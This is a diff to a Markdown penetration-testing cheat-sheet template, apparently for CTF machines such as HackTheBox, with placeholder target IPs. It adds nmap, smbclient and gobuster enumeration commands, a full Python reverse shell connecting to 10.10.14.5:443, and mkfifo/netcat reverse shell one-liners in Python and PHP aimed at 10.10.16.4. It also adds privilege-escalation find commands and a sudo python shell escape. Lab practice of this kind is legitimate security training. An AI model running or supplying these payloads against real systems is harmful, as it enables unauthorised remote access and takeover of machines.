@@ -2,37 +2,47 @@
 
 ## RECON
 
+* set `/etc/hosts` for {{.IPAddress}} if you see a domain.
+* enumerate subdomains `dig axfr <domain> @{{.IPAddress}}`
+
 ### NMAP
+
+_note: zsh needs quotations around wildcard `*`._
 
 scan ports ALL:
 
-`nmap -v -Pn -p- --min-rate=5000 -o nmap-{{.Name}}.txt {{.IPAddress}}`
+`nmap -v -Pn -p- --min-rate=5000 -oN nmap-{{.Name}}.txt {{.IPAddress}}`
 
 scan version, OS:
 
-`nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-{{.Name}}.txt {{.IPAddress}}`
+`nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -oN nmap-version-{{.Name}}.txt {{.IPAddress}}`
 
 vuln scan ALL:
 
-`nmap -v -Pn -p- -sV --script vuln* -o nmap-{{.Name}}.txt {{.IPAddress}}`
+`nmap -v -Pn -p- -sV --script "vuln*" -oN nmap-vuln-{{.Name}}.txt {{.IPAddress}}`
+
+#### SAMBA 
 
 samba enum, vuln:
 
-`nmap -v -Pn -p 139,445 --script smb-enum-shares {{.IPAddress}}`
+`nmap -v -Pn -p 139,445 --script smb-enum-shares {{.IPAddress}} -oN nmap-smb-shares-{{.Name}}.txt`
 
-`nmap -v -Pn -p 139,445 --script smb-vuln* {{.IPAddress}}`
+`nmap -v -Pn -p 139,445 --script "smb-vuln*" {{.IPAddress}} -oN nmap-smb-vuln-{{.Name}}.txt`
+
+* list `smbclient -L //{{.IPAddress}}`
+* login `smbclient //{{.IPAddress}}/<DIR>`
 
 ### GOBUSTER / FEROXBUSTER
 
 general enumeration:
 
-`gobuster dir -e -u http://{{.IPAddress}} -w $WORDLIST -o gobuster-{{.Name}}.txt`
+`gobuster dir -e -u http://{{.IPAddress}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-{{.Name}}.txt`
 
 add `-k` for `https`
 
 extension scan:
 
-`gobuster dir -x cgi,php,sh,log, -u http://{{.IPAddress}}/cgi-bin/ -w $WORDLIST`
+`gobuster dir -x cgi,php,sh,log, -u http://{{.IPAddress}}/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions.txt`
 
 Wordlists:
 
@@ -90,6 +100,37 @@ pty.spawn("/bin/sh")'
 
 listener: `socat file:`tty`,raw,echo=0 tcp-listen:12345`
 
+if you get root to run this, you get a root shell:
+
+```python
+#!/usr/bin/python
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.5",443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
+short python:
+
+```python
+import os
+os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444 >/tmp/f')
+```
+```
+PHP
+
+```php
+<?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f');
+?>
+```
 ### Upgrade your shell
 
 Python:
@@ -129,8 +170,9 @@ export TERM=xterm-256color #allows you to clear console, and have color output
 Other finds:
 
 ```bash
+find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null 
+find / -perm -222 -type d 2>/dev/null
 find / -perm -o w -type d 2>/dev/null 
 find / -perm -o x -type d 2>/dev/null 
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
@@ -161,3 +203,16 @@ python:
 sudo python -c 'import os; os.system("/bin/sh")'
 ```
 
+## FLAGS
+
+### user.txt
+
+```bash
+
+```
+
+### root.txt
+
+```bash
+
+```
